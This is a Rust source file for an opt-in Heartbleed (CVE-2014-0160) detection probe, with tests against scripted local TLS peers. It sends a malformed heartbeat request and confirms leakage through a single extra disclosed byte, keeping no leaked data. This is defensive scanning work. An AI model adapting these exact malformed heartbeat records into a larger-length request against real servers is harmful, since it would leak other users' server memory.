//! Opt-in Heartbleed probe (CVE-2014-0160, RFC 6520 §4).
//!
//! Sends a malformed heartbeat before completing the handshake. Only a
//! correlated response containing more bytes than were supplied confirms
//! disclosure. Silence and alerts are inconclusive, not evidence of safety.

use crate::{HelloResponse, ProbeError, ResponseParser, Transport, hello::client_hello};
use testls_wire::{AnyRecord, ContentType, Extension, ProtocolVersion, parse_record};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

/// Maximum bytes consumed during either phase of the probe.
const MAX_BYTES: usize = 256 * 1024;
/// Bytes actually supplied as heartbeat payload and padding combined.
const SUPPLIED: usize = 32;

/// Attempts one pre-handshake Heartbleed disclosure at `version`.
///
/// Returns only whether disclosure was confirmed. Errors, including a peer
/// refusing the request, must be reported as inconclusive. Does not retain
/// disclosed bytes. TLS 1.0–1.2 only; the caller chooses accepted suites.
///
/// # Errors
/// Returns an error on RNG failure, unsupported versions, malformed or
/// uncorrelated replies, bounds violations, refusal and timeouts.
pub async fn probe_heartbleed(
    transport: &Transport,
    version: ProtocolVersion,
    suites: &[u16],
    sni: Option<&str>,
) -> Result<(), ProbeError> {
    if !(ProtocolVersion::TLS10..=ProtocolVersion::TLS12).contains(&version) || suites.is_empty() {
        return Err(ProbeError::Unexpected(
            "no applicable TLS version or cipher suite",
        ));
    }
    let mut marker = [0; SUPPLIED];
    getrandom::fill(&mut marker).map_err(|_| ProbeError::Unexpected("heartbeat RNG failed"))?;
    let mut hello = client_hello(version, suites.to_vec(), sni);
    hello.extensions.push(Extension::Raw {
        typ: 15,
        data: vec![1],
    });
    let bytes = hello.encode().map_err(ProbeError::Encode)?;
    let mut stream = transport.connect().await?;
    timeout(transport.read_timeout, async {
        stream.write_all(&bytes).await.map_err(ProbeError::Io)?;
        flight(&mut stream, version).await?;
        // Advertise one byte more than the entire supplied body. Unlike a
        // 64 KiB request this limits disclosure to one byte per connection.
        let [major, minor] = version.0.to_be_bytes();
        let mut request = vec![24, major, minor, 0, 35, 1, 0, 33];
        request.extend_from_slice(&marker);
        stream.write_all(&request).await.map_err(ProbeError::Io)?;
        // OpenSSL 1.0.1 buffers small replies during the handshake. A
        // server-only ServerHelloDone sent by the client ends this handshake
        // with unexpected_message (RFC 5246 §7.4), flushing any pending
        // heartbeat before the fatal alert. This adds no disclosure request.
        stream
            .write_all(&[22, major, minor, 0, 4, 14, 0, 0, 0])
            .await
            .map_err(ProbeError::Io)?;
        let body = heartbeat(&mut stream).await?;
        if disclosure(&body, &marker) {
            Ok(())
        } else {
            Err(ProbeError::Unexpected(
                "heartbeat did not confirm disclosure",
            ))
        }
    })
    .await
    .map_err(|_| ProbeError::Timeout)?
}

/// Reads a bounded plaintext server flight and verifies its negotiated version.
async fn flight(stream: &mut TcpStream, version: ProtocolVersion) -> Result<(), ProbeError> {
    let mut parser = ResponseParser::new();
    let mut total = 0;
    let mut buf = [0; 4096];
    loop {
        let n = stream.read(&mut buf).await.map_err(ProbeError::Io)?;
        if n == 0 {
            return Err(ProbeError::Unexpected("peer closed before server flight"));
        }
        total += n;
        if total > MAX_BYTES {
            return Err(ProbeError::Unexpected("server flight exceeds probe limit"));
        }
        if let Some(reply) = parser.push(&buf[..n]).map_err(ProbeError::Decode)? {
            return match reply {
                HelloResponse::ServerHello { hello, .. }
                    if hello.negotiated_version().map_err(ProbeError::Decode)? == version
                        && hello.extension(15) == Some(&[1][..]) =>
                {
                    Ok(())
                }
                _ => Err(ProbeError::Unexpected(
                    "peer did not negotiate heartbeat requests",
                )),
            };
        }
    }
}

/// Reads one bounded heartbeat response; unrelated records are inconclusive.
async fn heartbeat(stream: &mut TcpStream) -> Result<Vec<u8>, ProbeError> {
    let mut bytes = Vec::new();
    let mut buf = [0; 4096];
    loop {
        let n = stream.read(&mut buf).await.map_err(ProbeError::Io)?;
        if n == 0 {
            return Err(ProbeError::Unexpected(
                "peer closed after heartbeat request",
            ));
        }
        bytes.extend_from_slice(&buf[..n]);
        if bytes.len() > MAX_BYTES {
            return Err(ProbeError::Unexpected(
                "heartbeat reply exceeds probe limit",
            ));
        }
        if let Some((record, _)) = parse_record(&bytes).map_err(ProbeError::Decode)? {
            return match record {
                AnyRecord::Tls(record) if record.content_type == ContentType::Unknown(24) => {
                    Ok(record.fragment.to_vec())
                }
                _ => Err(ProbeError::Unexpected("peer refused malformed heartbeat")),
            };
        }
    }
}

/// Confirms a response echoes all supplied bytes and discloses an extra byte.
fn disclosure(body: &[u8], marker: &[u8; SUPPLIED]) -> bool {
    if body.len() < 3 {
        return false;
    }
    let length = usize::from(u16::from_be_bytes([body[1], body[2]]));
    body[0] == 2
        && length == SUPPLIED + 1
        && body.len() >= 3 + length + 16
        && body.get(3..3 + SUPPLIED) == Some(marker.as_slice())
}

#[cfg(test)]
mod tests {
    //! Correlation and disclosure boundary tests.
    use super::*;

    /// Reads one TLS record from the scripted peer.
    async fn read_record(stream: &mut TcpStream, version: Option<ProtocolVersion>) -> Vec<u8> {
        let mut head = [0; 5];
        stream.read_exact(&mut head).await.unwrap();
        if let Some(version) = version {
            assert_eq!(&head[1..3], &version.0.to_be_bytes());
        }
        let mut body = vec![0; usize::from(u16::from_be_bytes([head[3], head[4]]))];
        stream.read_exact(&mut body).await.unwrap();
        body
    }

    /// Frames small fixture payloads without using the production encoder.
    fn record(typ: u8, body: &[u8]) -> Vec<u8> {
        let mut bytes = vec![typ, 3, 3];
        bytes.extend_from_slice(&u16::try_from(body.len()).unwrap().to_be_bytes());
        bytes.extend_from_slice(body);
        bytes
    }

    /// Exercises the actual TCP probe against leaking and rejecting peers.
    #[tokio::test]
    async fn scripted_peers() {
        for (version, leak) in [
            ProtocolVersion::TLS10,
            ProtocolVersion::TLS11,
            ProtocolVersion::TLS12,
        ]
        .into_iter()
        .flat_map(|v| [true, false].map(|leak| (v, leak)))
        {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            let mut transport = Transport::new(listener.local_addr().unwrap());
            transport.read_timeout = std::time::Duration::from_secs(1);
            let server = tokio::spawn(async move {
                let (mut stream, _) = listener.accept().await.unwrap();
                let _ = read_record(&mut stream, None).await;
                let mut hello = vec![2, 0, 0, 45];
                hello.extend_from_slice(&version.0.to_be_bytes());
                hello.extend_from_slice(&[1; 32]);
                hello.extend_from_slice(&[0, 0xc0, 0x2f, 0, 0, 5, 0, 15, 0, 1, 1]);
                hello.extend_from_slice(&[14, 0, 0, 0]);
                // Fragment both the TLS record header and handshake across writes.
                let flight = record(22, &hello);
                for part in flight.chunks(3) {
                    stream.write_all(part).await.unwrap();
                }
                let request = read_record(&mut stream, Some(version)).await;
                assert_eq!(&request[..3], &[1, 0, 33]);
                assert_eq!(request.len(), 35);
                // Withhold the small reply until the client terminates the
                // handshake, modelling OpenSSL's buffered pre-handshake I/O.
                let termination = read_record(&mut stream, Some(version)).await;
                assert_eq!(termination, [14, 0, 0, 0]);
                let response = if leak {
                    let mut body = vec![2, 0, 33];
                    body.extend_from_slice(&request[3..]);
                    body.push(42);
                    body.extend_from_slice(&[0; 16]);
                    let mut reply = record(24, &body);
                    // OpenSSL flushes the heartbeat together with its alert.
                    reply.extend_from_slice(&record(21, &[2, 10]));
                    reply
                } else {
                    record(21, &[2, 10])
                };
                stream.write_all(&response).await.unwrap();
            });
            let result = probe_heartbleed(&transport, version, &[0xc02f], None).await;
            assert_eq!(result.is_ok(), leak);
            server.await.unwrap();
        }
    }

    /// Only an actual extra payload byte with the right marker confirms leakage.
    #[test]
    fn evidence() {
        let marker = [7; SUPPLIED];
        let mut body = vec![2, 0, 33];
        body.extend_from_slice(&marker);
        body.push(9);
        body.extend_from_slice(&[0; 16]);
        assert!(disclosure(&body, &marker));
        assert!(!disclosure(&body, &[8; SUPPLIED]));
        for n in 0..body.len() {
            assert!(!disclosure(&body[..n], &marker));
        }
        body[2] = 32;
        assert!(!disclosure(&body, &marker));
    }
}
